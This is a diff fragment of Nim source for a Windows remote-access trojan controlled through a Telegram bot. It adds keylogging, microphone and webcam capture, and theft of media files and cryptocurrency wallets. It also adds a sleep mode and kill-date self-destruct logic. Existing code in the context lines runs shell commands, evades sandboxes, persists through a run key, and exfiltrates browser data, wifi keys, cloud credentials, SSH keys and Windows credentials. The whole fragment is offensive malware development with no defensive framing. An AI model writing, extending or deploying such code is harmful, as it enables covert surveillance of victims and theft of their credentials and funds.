       "/find <dir>*<glob>    recursive file search (capped 500)\n" &
       "/clip                 clipboard snapshot\n" &
+      "/keys start|stop      keylogger (sends captures as documents)\n" &
+      "/mic <seconds>        record mic audio, send as WAV (max 120)\n" &
+      "/cam                  capture from default webcam as document\n" &
       "/exfil browser        stage Chrome/Edge SQLite + Local State\n" &
       "/exfil wifi           saved wifi profiles (cleartext keys)\n" &
       "/exfil cloud          AWS / GCP / Azure / Git / Kube creds\n" &
       "/exfil ssh            %USERPROFILE%\\.ssh contents\n" &
       "/exfil recent         jump lists\n" &
-      "/exfil wincreds       vaultcmd /listcreds"
+      "/exfil wincreds       vaultcmd /listcreds\n" &
+      "/exfil media          existing audio/video files (cap 500 MB)\n" &
+      "/exfil wallet         ETH keystore / BTC wallet.dat / MetaMask"
 
   proc cmdExec(command: string): string =
     if command.strip().len == 0: return "(empty command)"
@@ -2880,6 +3451,13 @@ when defined(c2_tg):
            "polls:        " & $tgPollsOk & "/" & $tgPollsTotal & " ok\n" &
            "last_poll:    " & lastOkStr & "\n" &
            "last_err:     " & (if tgLastPollErr.len > 0: tgLastPollErr else: "-") & "\n" &
+           "killdate:     " & (if tgMetaKillDate > 0:
+                                 fromUnix(tgMetaKillDate).format("yyyy-MM-dd HH:mm") &
+                                 " (" & $(tgMetaKillDate - getTime().toUnix()) & "s)"
+                               else: "not set") & "\n" &
+           "sleeping:     " & (if tgSleepEpoch > 0 and getTime().toUnix() < tgSleepEpoch:
+                                 $(tgSleepEpoch - getTime().toUnix()) & "s left (/wake)"
+                               else: "no") & "\n" &
            "variant:      " & VARIANT_NAME & "\n" &
            "persistence:\n" &
            "  run_key:    " & runkey & "\n" &
@@ -2979,6 +3557,10 @@ when defined(c2_tg):
         except: discard
     let status = if deleted: "deleted" elif how.len > 0: "scheduled for delete" else: "left in place"
     lines.add("  binary: " & status & " (" & binary & ", " & how & ")")
+    try:
+      removeFile(TG_META_FILE)
+      lines.add("  meta:     removed")
+    except: discard
     return "selfdestruct complete:\n" & lines.join("\n")
 
   proc installRunKey(): string =
@@ -3104,6 +3686,18 @@ when defined(c2_tg):
   proc handleMessage(text: string, msg: JsonNode): string =
     let (cmd, arg) = splitCmd(text)
     if cmd.len == 0: return ""
+    # Quiet mode: only /wake (and /status) are honored; everything
+    # else gets a one-line notice. Messages still queue via offset.
+    if tgSleepEpoch > 0 and getTime().toUnix() < tgSleepEpoch:
+      if cmd == "/wake":
+        tgSleepEpoch = 0
+        tgMetaSleepMin = 0
+        saveTgMeta()
+        return "[+] awake"
+      if cmd == "/status": discard
+      else:
+        let remain = tgSleepEpoch - getTime().toUnix()
+        return "[zzz] sleeping " & $remain & "s more - send /wake"
     case cmd
     of "/help", "/?":         cmdHelp()
     of "/cmd", "/shell":      cmdExec(arg)
@@ -3153,15 +3747,45 @@ when defined(c2_tg):
     of "/sleep":
       try:
         let n = max(0, parseInt(arg.strip()))
-        let capped = min(n, 24 * 3600)
-        sleep(capped * 1000)
-        "slept " & $n & "s"
+        let capped = min(n, 7 * 24 * 3600)
+        # Non-blocking quiet mode: the poll loop keeps running at a
+        # slow cadence (so /wake works) but only /wake is honored.
+        tgSleepEpoch = getTime().toUnix() + capped
+        tgMetaSleepMin = (capped div 60).int
+        saveTgMeta()
+        "sleeping " & $capped & "s (until " &
+          fromUnix(tgSleepEpoch).format("yyyy-MM-dd HH:mm:ss") &
+          ") - send /wake to end early; messages queue"
       except: "usage: /sleep <seconds>"
+    of "/wake":
+      if tgSleepEpoch > 0:
+        tgSleepEpoch = 0
+        tgMetaSleepMin = 0
+        saveTgMeta()
+        "[+] awake"
+      else: "not sleeping"
+    of "/killdate":
+      # /killdate <unix_ts>  - hard self-destruct deadline
+      # /killdate off        - clear it
+      try:
+        if arg.strip().toLowerAscii() in ["off", "0", "clear"]:
+          tgMetaKillDate = 0
+          saveTgMeta()
+          "[+] kill date cleared"
+        else:
+          let ts = parseInt(arg.strip())
+          if ts < getTime().toUnix():
+            "[!] kill date is in the past - agent would die immediately"
+          else:
+            tgMetaKillDate = ts
+            saveTgMeta()
+            "[+] kill date set: " & fromUnix(ts).format("yyyy-MM-dd HH:mm:ss")
+      except: "usage: /killdate <unix_ts> | /killdate off"
     of "/upload":
       let upath = pathArg(arg)
       if fileExists(upath):
         let sz = getFileSize(upath)
-        if tgSendDocument(upath, upath & " (" & $sz & " B)"): "uploaded: " & upath
+        if tgSendDocumentChunked(upath, upath & " (" & $sz & " B)"): "uploaded: " & upath
         else: "upload failed"
       else: "not a file: " & upath
     of "/dl":
@@ -3182,9 +3806,38 @@ when defined(c2_tg):
           of "ssh":      exfilSshKeys()
           of "recent":   exfilRecentFiles()
           of "wincreds": exfilWinCreds()
+          of "media":    exfilMediaFiles()
+          of "wallet":   exfilWalletData()
           else: %* {"type": "exfil", "kind": "?", "error":
-                      "usage: /exfil browser|wifi|cloud|ssh|recent|wincreds"}
+                      "usage: /exfil browser|wifi|cloud|ssh|recent|wincreds|media|wallet"}
         $result
+    of "/keys":
+      when defined(windows): cmdKeys(arg)
+      else: "keys: windows only"
+    of "/mic":
+      when defined(windows):
+        let secs = clamp(parseInt("0" & arg.strip()), 1, 120)
+        discard tgSendText("[*] recording mic " & $secs & "s ...")
+        let (ok, wavPath, err) = captureMicSync(secs)
+        if ok:
+          if not tgSendDocument(wavPath, "mic " & $secs & "s"):
+            discard tgSendText("[!] mic upload failed")
+          try: removeFile(wavPath) except: discard
+          ""
+        else: err
+      else: "mic: windows only"
+    of "/cam":
+      when defined(windows):
+        let devIdx = parseInt("0" & arg.strip())
+        discard tgSendText("[*] capturing cam" & $devIdx & " ...")
+        let (ok, bmpPath, info) = captureCamSync(devIdx)
+        if ok:
+          if not tgSendDocument(bmpPath, "cam" & $devIdx & " " & info):
+            discard tgSendText("[!] cam upload failed")
+          try: removeFile(bmpPath) except: discard
+          ""
+        else: info  # error text on failure
+      else: "cam: windows only"
     of "/hook":
       if webhookEnabled():
         let ok = sendToHook("[" & BuildPrefix & "] " & arg)
@@ -3201,7 +3854,21 @@ when defined(c2_tg):
 
   proc pollLoop() =
     var offset = 0
+    var lastContactStamp = getTime().toUnix()
+    var nextWake = getMonoTime()
     while true:
+      if tgIsKilled():
+        logMsg("kill date / dead-man tripped mid-run - selfdestruct")
+        discard tgSendText("[!] kill date reached - selfdestructing")
+        discard cmdSelfdestruct()
+        quit(0)
+      # Stamp lastContact into meta once a minute so the dead-man
+      # switch only trips when the agent is truly unreachable.
+      let nowUnix = getTime().toUnix()
+      if nowUnix - lastContactStamp >= 60:
+        tgMetaLastContact = nowUnix
+        saveTgMeta()
+        lastContactStamp = nowUnix
       inc tgPollsTotal
       try:
         var bodyObj = newJObject()
@@ -3269,8 +3936,13 @@ when defined(c2_tg):
         tgLastPollErr = e.msg
         logMsg("poll err: " & e.msg)
         try: sleep(5_000) except: discard
-      let jitter = PollBaseMs.int * (70 + rand(60)) div 100
-      try: sleep(jitter) except: discard
+      # Quiet mode polls at a slow 30s cadence (still enough for /wake
+      # to land within half a minute); normal mode uses jittered base.
+      if tgSleepEpoch > 0 and getTime().toUnix() < tgSleepEpoch:
+        try: sleep(30_000) except: discard
+      else:
+        let jitter = PollBaseMs.int * (70 + rand(60)) div 100
+        try: sleep(jitter) except: discard
 
   # First-run best-effort persistence (defined before main so main can call it)
   proc ensurePersistenceAtStartup() =
@@ -3293,6 +3965,11 @@ when defined(c2_tg):
     if antiAnalysisCheck():
       logMsg("sandbox heuristic triggered, exiting silently")
       return
+    loadTgMeta()
+    if tgIsKilled():
+      logMsg("kill date / dead-man switch tripped at boot - selfdestruct")
+      discard cmdSelfdestruct()
+      quit(0)
     ensurePersistenceAtStartup()
     initialOnline()
     pollLoop()
